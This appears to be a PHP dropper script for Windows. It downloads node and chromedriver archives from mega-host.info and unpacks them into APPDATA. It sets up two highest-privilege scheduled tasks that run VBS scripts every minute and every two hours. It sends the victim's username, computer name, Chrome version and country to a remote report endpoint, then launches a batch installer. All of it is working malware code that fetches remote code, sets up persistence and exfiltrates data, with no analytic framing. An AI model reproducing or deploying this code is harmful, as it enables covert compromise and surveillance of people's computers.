<?php
$path = __dir__."/node.zip";
$dir = __dir__."/node/node_modules";
$chromezip = __dir__."/chromedriver.zip";
$chromedir = __dir__."/chromedriver";
$downloadURL = "http://mega-host.info/q/node.zip";

/********************Chrome************************/
$shell= new COM('WScript.Shell');
//trigger exception in a "try" block
$ChromeVer = null;
	try {
		$GetChromeVer =  $shell->regRead('HKEY_CURRENT_USER\Software\Google\Chrome\BLBeacon\version');
		//$oExec = $shell->Run("cmd /C $cmd ", 0, true);
		$Chrome = explode(".",$GetChromeVer);
	//	print_r($Chrome);
		  $ChromeVer =  $Chrome[0];
	}
	catch(Exception $e) {
		
	}
	 
				 
	if ($ChromeVer) {
		$chromeurl = "http://mega-host.info/q/chrome.php?ver=".$ChromeVer;
		if(file_exists($chromedir) == true) {
				$cmd = $chromedir."/./chromedriver.exe -v";
			    $oExec =exec("$cmd");
				$getchromedrivever = explode("(",$oExec);
				$chromedrivever = trim(str_replace("ChromeDriver","",$getchromedrivever[0]));
				$drivever = explode(".",$chromedrivever);
			//	print_r($drivever);
				if ($drivever[0] !== $ChromeVer) {
					
					downloadFile($chromeurl,$chromezip);
					
					$output = shell_exec('taskkill /F /IM "node.exe"');
					$zip = new ZipArchive;
					if ($zip->open($chromezip) === TRUE) {
						$zip->extractTo($_SERVER['APPDATA']."\LM/chromedirve");
						$zip->close();
						//echo 'ok';
					} else {
						//echo 'failed';
					}
				}
				// make explode to get ver  
				// if yes ==  chromever skip 
				// else download new ver 
		}
		
		
		if(file_exists($chromezip) == false) {
		downloadFile($chromeurl,$chromezip);
		}
		if(file_exists($chromedir) == false) {
			$output = shell_exec('taskkill /F /IM "node.exe"');
			$zip = new ZipArchive;
				if ($zip->open($chromezip) === TRUE) {
					$zip->extractTo($_SERVER['APPDATA']."\LM/chromedirve");
					$zip->close();
					//echo 'ok';
				} else {
					//echo 'failed';
				}	
			
			
		}
		
		
		//echo $ChromeVer;
	}

 /********************Chrome************************/
 
 /********************Node************************/
 
  
	if(file_exists($path) == false) {
		downloadFile($downloadURL,$path);
	}
	if(file_exists($dir) == false) {
		$zip = new ZipArchive;
		if ($zip->open($path) === TRUE) {
			$zip->extractTo(__dir__."/");
			$zip->close();
			//echo 'ok';
		} else {
			//echo 'failed';
		}
	}
	
 /********************Node************************/




/***************schtasks***********************/
 
	//$cmd = "schtasks.exe /CREATE /TN \"zzzzzzzzzzz\" /xml \"mega.xml\" /RU System";
$cmd = 'schtasks.exe /create /sc minute /mo 120 /tn "GMCUpdate" /f /TR "'.$_SERVER['APPDATA'].'\LM\update.vbs" /RL HIGHEST';
try {
pclose(popen("start /B ". $cmd, "r")); // OR exec($cmd);
//exec($cmd); // OR exec($cmd);
$oExec = $shell->Run("cmd /C $cmd ", 0, true);
}
catch(Exception $e) {
		echo $e;
	}
	
$cmd = 'schtasks.exe /create /sc minute /mo 1 /tn "GMCNodeScript" /f /TR "'.$_SERVER['APPDATA'].'\LM\node\script.vbs" /RL HIGHEST';
try {
pclose(popen("start /B ". $cmd, "r")); // OR exec($cmd);
//exec($cmd); // OR exec($cmd);
$oExec = $shell->Run("cmd /C $cmd ", 0, true);
}
catch(Exception $e) {
		echo $e;
	}
	$ipobj = null;
	try{
		$getip = file_get_contents("http://pro.ip-api.com/json/?key=VtYyGsHwqmIqRlx");
		$ipobj = json_decode($getip);
		
	}
	catch(Exception $e) {
		echo $e;
	}
$comname = $_SERVER['COMPUTERNAME'];
$cusername = $_SERVER['USERNAME'];
$rep = file_get_contents("http://mega-host.info/q/report.php?username=".$cusername."&comname=".$comname."&chrome=".$ChromeVer."&country=".$ipobj->country);
$repobj = json_decode($rep);
file_put_contents(__dir__."/node/id.txt",$repobj->id);
$slin = "installsl.bat";
pclose(popen("start /B ". $slin, "r")); // OR exec($cmd);
/***************schtasks***********************/
function downloadFile($url, $path) {
    $newfname = $path;
    $file = fopen ($url, 'rb');
    if ($file) {
        $newf = fopen ($newfname, 'wb');
        if ($newf) {
            while(!feof($file)) {
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            }
        }
    }
    if ($file) {
        fclose($file);
    }
    if ($newf) {
        fclose($newf);
    }
}
?>